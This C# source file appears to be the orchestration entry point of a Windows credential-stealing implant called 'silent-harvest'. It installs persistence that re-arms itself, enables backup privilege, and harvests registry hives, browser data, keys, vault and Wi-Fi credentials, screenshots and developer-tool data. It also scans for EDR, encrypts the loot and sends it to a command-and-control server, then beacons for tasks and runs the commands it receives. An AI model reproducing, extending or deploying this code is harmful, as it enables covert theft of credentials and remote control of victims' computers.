// silent-harvest implant — entry point / orchestration
using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

namespace SilentHarvest
{
    public static class Program
    {
        private static string c2 = Cfg.C2;
        private static string outFile = null;
        private static string psk = DecodePsk();
        private static string only = null;
        private static int loopSec = 0;
        private static int jitterSec = 60;
        private static int cycles = 0;              // 0 = infinite (loop mode)
        private static bool persist = false;
        private static string pname = "shsvc";      // persistence name
        private static byte[] pskBytes = null;
        private static List<Part> extraParts = new List<Part>();

        /// <summary>Config stores the PSK XOR+base64 (defeats casual strings
        /// scans only). Decode it once at startup.</summary>
        private static string DecodePsk()
        {
            try
            {
                byte[] x = Convert.FromBase64String(Cfg.PskEnc);
                string hex = Cfg.PskXorHex;
                byte[] k = new byte[hex.Length / 2];
                for (int i = 0; i < k.Length; i++)
                    k[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
                byte[] p = new byte[x.Length];
                for (int i = 0; i < x.Length; i++) p[i] = (byte)(x[i] ^ k[i % k.Length]);
                return System.Text.Encoding.UTF8.GetString(p);
            }
            catch
            {
                return "";
            }
        }

        private static int Main(string[] argv)
        {
            for (int i = 0; i < argv.Length; i++)
            {
                string a = argv[i].ToLowerInvariant();
                if (a == "--c2" && i + 1 < argv.Length) c2 = argv[++i];
                else if (a == "--out" && i + 1 < argv.Length) outFile = argv[++i];
                else if (a == "--psk" && i + 1 < argv.Length) psk = argv[++i];
                else if (a == "--only" && i + 1 < argv.Length) only = argv[++i].ToLowerInvariant();
                else if (a == "--loop" && i + 1 < argv.Length) loopSec = int.Parse(argv[++i]);
                else if (a == "--jitter" && i + 1 < argv.Length) jitterSec = int.Parse(argv[++i]);
                else if (a == "--cycles" && i + 1 < argv.Length) cycles = int.Parse(argv[++i]);
                else if (a == "--persist") persist = true;
                else if (a == "--persist-list")
                {
                    // explicit operator command: visible even in stealth builds
                    Console.WriteLine("persistence: {0} (staged: {1})",
                        Stages.CheckPersistence(pname), Stages.StagedPath(pname));
                    return 0;
                }
                else if (a == "--persist-remove")
                {
                    Console.WriteLine("{0}", Stages.RemovePersistence(pname));
                    return 0;
                }
                else if (a == "--pname" && i + 1 < argv.Length) pname = argv[++i];
                else if (a == "--wait" && i + 1 < argv.Length)
                {
                    int ms;
                    if (int.TryParse(argv[++i], out ms)) System.Threading.Thread.Sleep(ms);
                }
            }

            pskBytes = System.Text.Encoding.UTF8.GetBytes(psk ?? "");

            // launched by persistence (staged under %APPDATA%\Microsoft)?
            // then default to beacon loop mode without needing CLI args
            if (loopSec <= 0)
            {
                try
                {
                    string self = System.Reflection.Assembly.GetExecutingAssembly().Location;
                    string stagedDir = Path.Combine(
                        Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                        "Microsoft");
                    if (!string.IsNullOrEmpty(self) &&
                        self.StartsWith(stagedDir, StringComparison.OrdinalIgnoreCase))
                    {
                        loopSec = 300;
                        jitterSec = 60;
                        Util.Log("persistence launch: loop mode on (300s)");
                    }
                }
                catch { }
            }

            // --persist installs user-level persistence and exits (unless
            // combined with an immediate run). staged copy relaunches with
            // --loop so tasking keeps flowing after reboot.
            if (persist)
            {
                string pr = Stages.PersistStage(pname, loopSec > 0 ? loopSec : 300,
                                                jitterSec > 0 ? jitterSec : 60);
                Util.Log("persist: {0}", pr);
            }

            int cycle = 0;
            while (true)
            {
            cycle++;
            if (cycles > 0 && cycle > cycles) break;

            // persistence watchdog: re-arm if every mechanism was removed
            // (also the path that makes a tasked persist:true finally take
            // effect -- previously the flag was set after the install block)
            if (persist && cycle % 10 == 1
                && Stages.CheckPersistence(pname) == "none")
            {
                string prr = Stages.PersistStage(pname,
                    loopSec > 0 ? loopSec : 300,
                    jitterSec > 0 ? jitterSec : 60);
                Util.Log("persist re-armed: {0}", prr);
            }

            bool elevated = Stages.IsElevated();
            bool backup = Stages.EnableBackupPrivilege();
            // TokenElevation has lied under some UAC contexts; a successfully
            // enabled SeBackupPrivilege is itself proof of an admin token
            if (backup) elevated = true;
            Util.Log("host={0} user={1} elevated={2} SeBackup={3}",
                Environment.MachineName, Environment.UserName, elevated, backup);

            List<Part> parts = new List<Part>();
            parts.Add(new Part("sysinfo.json",
                Encoding.UTF8.GetBytes(Stages.SysinfoJson(elevated, backup)), null));

            bool wantReg = only == null || only.Contains("reg");
            bool wantHives = only == null || only.Contains("hive");
            bool wantBrowsers = only == null || only.Contains("brow");
            bool wantKeys = only == null || only.Contains("key");
            bool wantVault = only == null || only.Contains("vault");
            bool wantWifi = only == null || only.Contains("wifi");
            bool wantShot = only == null || only.Contains("shot");
            bool wantDevt = only == null || only.Contains("devt");

            if (wantReg)
            {
                string s = Stages.RegistryStage(parts);
                Util.Log("registry stage: {0}", s);
            }
            if (wantHives && elevated)
            {
                string s = Stages.HiveStage(parts);
                Util.Log("hive stage: {0}", s);
            }
            else if (wantHives)
            {
                Util.Log("hive stage: skipped (not elevated)");
            }
            if (wantBrowsers)
            {
                string s = Stages.BrowserStage(parts);
                Util.Log("browser stage: {0}", s);
            }
            if (wantKeys)
            {
                string s = Stages.KeysStage(parts);
                Util.Log("keys stage: {0}", s);
            }
            if (wantVault)
            {
                string s = Stages.VaultStage(parts, elevated);
                Util.Log("vault stage: {0}", s);
            }
            if (wantWifi)
            {
                string s = Stages.WifiStage(parts, elevated);
                Util.Log("wifi stage: {0}", s);
            }
            if (wantShot)
            {
                byte[] png = Stages.ScreenshotPng();
                if (png != null)
                {
                    parts.Add(new Part("win:screenshot.png", png, null));
                    Util.Log("screenshot: {0} bytes", png.Length);
                }
            }
            if (wantDevt)
            {
                string s2 = Stages.DevToolsStage(parts);
                Util.Log("devtools stage: {0}", s2);
            }
            Stages.EdrScan(parts);

            if (parts.Count <= 1)
            {
                Util.Log("nothing collected, aborting");
                return 1;
            }

            // ---- assemble container ----
            long total = 0;
            foreach (Part p in parts) total += p.Data.Length;
            byte[] blobAll = new byte[total];
            long off = 0;
            StringBuilder partsJson = new StringBuilder();
            bool first = true;
            foreach (Part p in parts)
            {
                Buffer.BlockCopy(p.Data, 0, blobAll, (int)off, p.Data.Length);
                if (!first) partsJson.Append(',');
                first = false;
                partsJson.Append("{\"name\":\"").Append(Util.EscapeJson(p.Name))
                          .Append("\",\"off\":").Append(off)
                          .Append(",\"len\":").Append(p.Data.Length)
                          .Append(",\"meta\":").Append(p.MetaJson).Append('}');
                off += p.Data.Length;
            }

            // fold any tasked-exec output into this cycle's container --
            // must happen before the parts are serialized into the manifest
            foreach (Part ep in extraParts)
            {
                parts.Add(ep);
                if (partsJson.Length > 0) partsJson.Append(",");
                partsJson.Append("{\"name\":\"").Append(Util.EscapeJson(ep.Name))
                    .Append("\",\"off\":").Append(blobAll.Length)
                    .Append(",\"len\":").Append(ep.Data.Length)
                    .Append(",\"meta\":").Append(ep.MetaJson ?? "null").Append("}");
                byte[] epb = new byte[blobAll.Length + ep.Data.Length];
                Buffer.BlockCopy(blobAll, 0, epb, 0, blobAll.Length);
                Buffer.BlockCopy(ep.Data, 0, epb, blobAll.Length, ep.Data.Length);
                blobAll = epb;
            }

            StringBuilder manifest = new StringBuilder();
            manifest.Append("{\"v\":1,\"victim\":").Append(Stages.SysinfoJson(elevated, backup))
                    .Append(",\"parts\":[").Append(partsJson).Append("]}");

            byte[] container;
            try
            {
                container = Crypto.BuildContainer(manifest.ToString(), blobAll,
                    Encoding.UTF8.GetBytes(psk));
            }
            catch (Exception e)
            {
                Util.Log("crypto failure: {0}", e.Message);
                return 3;
            }
            Util.Log("container: {0} bytes from {1} parts", container.Length, parts.Count);

            bool ok;
            if (outFile != null)
                ok = Exfil.WriteOut(container, outFile);
            else
                ok = Exfil.Post(container, c2);

            if (!ok && outFile == null)
            {
                try
                {
                    string alt = Path.Combine(Path.GetTempPath(),
                        "sh_" + Environment.MachineName + "_" +
                        ((long)(DateTime.UtcNow - new DateTime(1970, 1, 1)).TotalSeconds) + ".bin");
                    Exfil.WriteOut(container, alt);
                    Util.Log("C2 unreachable; container dropped at {0}", alt);
                }
                catch { }
                if (loopSec <= 0) return 2;
            }
            else if (loopSec <= 0)
                return ok ? 0 : 2;

            // cycles exhausted? exit before the long sleep
            if (cycles > 0 && cycle >= cycles)
                return ok ? 0 : 2;

            // loop mode: sleep with jitter, then beacon for the next task
            Random rng = new Random();
            int sleepMs = (loopSec + rng.Next(-jitterSec, jitterSec + 1)) * 1000;
            if (sleepMs < 1000) sleepMs = 1000;
            Util.Log("cycle {0} done; sleeping {1}s", cycle, sleepMs / 1000);
            System.Threading.Thread.Sleep(sleepMs);

            // beacon: pull one encrypted task and apply it as the next cycle's plan
            try
            {
                string bid = System.Uri.EscapeDataString(
                    Environment.MachineName + "-" + Environment.UserName);
                // derive the beacon URL robustly even if --c2 lacks /gate
                string burl = c2.Contains("/gate")
                    ? c2.Replace("/gate", "/beacon")
                    : c2.TrimEnd('/') + "/beacon";
                burl += "?id=" + bid + "&v=1.1.0&p=" +
                        System.Uri.EscapeDataString(Stages.CheckPersistence(pname));
                byte[] tb = Exfil.Get(burl);
                if (tb != null && pskBytes != null)
                {
                    string mjson; byte[] pblob;
                    if (Crypto.UnpackContainer(tb, pskBytes, out mjson, out pblob))
                    {
                        Util.Log("task received: {0}", mjson);
                        // task.json part is the whole blob for single-part packs
                        try
                        {
                            var j = new System.Web.Script.Serialization.JavaScriptSerializer()
                                .Deserialize<Dictionary<string, object>>(mjson);
                            string tjson = System.Text.Encoding.UTF8.GetString(pblob);
                            var t = new System.Web.Script.Serialization.JavaScriptSerializer()
                                .Deserialize<Dictionary<string, object>>(tjson);
                            if (t.ContainsKey("stages")) only = (t["stages"] ?? "").ToString().ToLowerInvariant();
                            if (t.ContainsKey("persist") && "True".Equals("" + t["persist"])) persist = true;
                            if (t.ContainsKey("exec"))
                            {
                                byte[] outp = Stages.RunTaskCommand(t["exec"].ToString(), 60000);
                                extraParts.Add(new Part("task:exec.txt", outp, null));
                            }
                        }
                        catch (Exception te) { Util.Log("task parse: {0}", te.Message); }
                    }
                }
            }
            catch (Exception be) { Util.Log("beacon: {0}", be.Message); }
            }
            return 0;   // cycles exhausted
        }
    }
}
